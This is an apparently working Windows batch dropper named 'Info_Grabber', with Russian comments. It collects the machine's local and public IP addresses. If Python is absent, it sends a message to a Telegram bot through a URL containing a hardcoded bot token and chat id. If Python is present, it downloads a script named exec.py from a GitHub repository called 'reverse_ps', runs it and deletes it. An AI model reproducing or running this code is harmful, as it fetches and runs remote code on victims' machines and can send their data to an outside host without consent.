:: Installer Info_Grabber.py
:: @govno_coder_ot_kota
:: MIT license
@echo off
setlocal enabledelayedexpansion
chcp 65001

:: Идём в Roaming
cd %AppData%

:: Получаем локальный IP
for /f "tokens=2 delims=:" %%i in ('ipconfig ^| findstr /C:"IPv4"') do set "localIP=%%i"
set "localIP=!localIP:~1!"

:: Получаем внешний IP
for /f "tokens=*" %%i in ('curl -s http://api.ipify.org') do set publicIP=%%i
echo !localIP!
echo !publicIP!

:: Проверка наличия Python на ПК
python --version >nul 2>&1
if errorlevel 1 (
    :: Если Питон нет
    :: то мы скажем, что нету питона :/
    setlocal enabledelayedexpansion
    set "localIP=192.168.1.1"  REM Пример локального IP
    set "public=95.73.225.85"   REM Пример публичного IP
    set "message=🐍 Python не установлен.     ||     💻 Локальный IP: !localIP!     ||     🌎 Внешний IP: !public!"
    set "encodedMessage=!message: =%%20!"
    curl "https://api.telegram.org/bot7539990102:AAFCEwvXc2yzf-FUD-UD8vH_uHM1Vfoo_NA/sendMessage?chat_id=1320559926&text=!encodedMessage!"
) else (
    :: Если Питон есть!
    :: мы скачем exec.py и выполним его!
    pip install py-cpuinfo requests Pillow
    curl https://raw.githubusercontent.com/tot-camiy-coder/reverse_ps/refs/heads/main/exec.py -o temp.py
    python temp.py
    del temp.py
)
